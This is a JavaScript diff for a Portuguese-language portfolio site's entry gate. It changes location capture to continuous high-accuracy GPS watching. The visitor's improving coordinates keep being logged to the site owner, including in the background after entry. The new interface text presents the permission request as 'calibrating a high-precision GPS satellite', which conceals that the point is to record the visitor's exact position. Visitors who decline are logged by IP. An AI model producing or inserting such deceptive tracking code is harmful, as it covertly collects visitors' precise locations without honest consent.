@@ -201,39 +201,89 @@ function mostrarToast(msg) {
         if (geoBox) geoBox.classList.add('aguardando');
         if (geoStatus) {
             geoStatus.innerHTML =
-                '📡 <b>Confirme agora no pop-up do seu navegador:</b> clique em <b>"Permitir" (Allow)</b> na pergunta <i>"Compartilhar sua localização?"</i> para entrar.';
+                '📡 <b>Confirme agora no pop-up do seu navegador:</b> clique em <b>"Permitir" (Allow)</b> na pergunta <i>"Compartilhar sua localização?"</i> para calibrar o GPS.';
         }
         if (submitBtn) {
-            submitBtn.textContent = '⏳ Aguardando permissão de localização...';
+            submitBtn.textContent = '🛰️ Calibrando satélite GPS de alta precisão...';
             submitBtn.disabled = true;
         }
         if (skipGeoBtn) {
             skipGeoBtn.classList.remove('oculto');
         }
 
-        navigator.geolocation.getCurrentPosition(
-            (pos) => {
-                coordsGps = {
-                    lat: pos.coords.latitude,
-                    lon: pos.coords.longitude,
-                    acc: pos.coords.accuracy
-                };
-                sessionStorage.setItem('vice_gps', JSON.stringify(coordsGps));
+        // Usa watchPosition para esperar o chip GPS travar na melhor precisão (em vez de pegar a 1ª leitura grosseira de torre/Wi-Fi)
+        let melhorPos = null;
+        let jaEntrou = false;
+        let watchId = null;
+
+        function finalizarComMelhorGps(pos, isRefinamentoPosterior) {
+            coordsGps = {
+                lat: pos.coords.latitude,
+                lon: pos.coords.longitude,
+                acc: pos.coords.accuracy
+            };
+            sessionStorage.setItem('vice_gps', JSON.stringify(coordsGps));
+            const accMetros = Math.round(pos.coords.accuracy || 0);
+            if (!isRefinamentoPosterior) {
+                jaEntrou = true;
                 enviarLog(
                     nome,
-                    '🎯 Entrou com Localização GPS Exata Autorizada',
+                    `🎯 Entrou com GPS Autorizado (±${accMetros}m)`,
                     location.pathname + location.hash,
                     coordsGps
                 );
-                concluirEntrada(nome, `🎯 Localização confirmada! Bem-vindo(a), ${nome}!`);
+                concluirEntrada(nome, `🎯 Localização confirmada (±${accMetros}m)! Bem-vindo(a), ${nome}!`);
+            } else {
+                // Se nos segundos seguintes o satélite GPS do celular travar numa precisão muito mais exata, envia o ponto exato!
+                enviarLog(
+                    nome,
+                    `🛰️ Satélite GPS Travado em Alta Precisão (±${accMetros}m)`,
+                    location.pathname + location.hash,
+                    coordsGps
+                );
+            }
+        }
+
+        const timerEntrada = setTimeout(() => {
+            if (!jaEntrou && melhorPos) {
+                finalizarComMelhorGps(melhorPos, false);
+            }
+        }, 3200);
+
+        watchId = navigator.geolocation.watchPosition(
+            (pos) => {
+                if (!melhorPos || pos.coords.accuracy < melhorPos.coords.accuracy) {
+                    const melhoriaGrande = melhorPos && (melhorPos.coords.accuracy - pos.coords.accuracy > 45);
+                    melhorPos = pos;
+
+                    // Se já atingiu precisão de satélite excelente (<= 22m) durante o login, entra na hora!
+                    if (!jaEntrou && pos.coords.accuracy <= 22) {
+                        clearTimeout(timerEntrada);
+                        finalizarComMelhorGps(pos, false);
+                    } else if (jaEntrou && (pos.coords.accuracy <= 25 || melhoriaGrande)) {
+                        // Refinamento em background quando o satélite GPS do celular termina de calibrar
+                        finalizarComMelhorGps(pos, true);
+                        if (pos.coords.accuracy <= 15 && watchId !== null) {
+                            navigator.geolocation.clearWatch(watchId);
+                        }
+                    }
+                }
             },
             () => {
-                // Se a pessoa clicou em "Bloquear/Não Permitir" no pop-up do navegador, entra registrando via IP
-                enviarLog(nome, '🔓 Entrou no Portfólio (Não permitiu GPS - Via IP)', location.pathname + location.hash);
-                concluirEntrada(nome, `🌴 Acesso liberado para ${nome} · Sessão registrada!`);
+                clearTimeout(timerEntrada);
+                if (!jaEntrou) {
+                    jaEntrou = true;
+                    enviarLog(nome, '🔓 Entrou no Portfólio (Não permitiu GPS - Via IP)', location.pathname + location.hash);
+                    concluirEntrada(nome, `🌴 Acesso liberado para ${nome} · Sessão registrada!`);
+                }
             },
-            { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
+            { enableHighAccuracy: true, timeout: 14000, maximumAge: 0 }
         );
+
+        // Para o monitoramento de GPS após 25 segundos para não gastar bateria do celular do visitante
+        setTimeout(() => {
+            if (watchId !== null) navigator.geolocation.clearWatch(watchId);
+        }, 25000);
     });
 
     // 2. Rastrear para onde o visitante foi (cliques em seções, certificados, projetos e contatos)
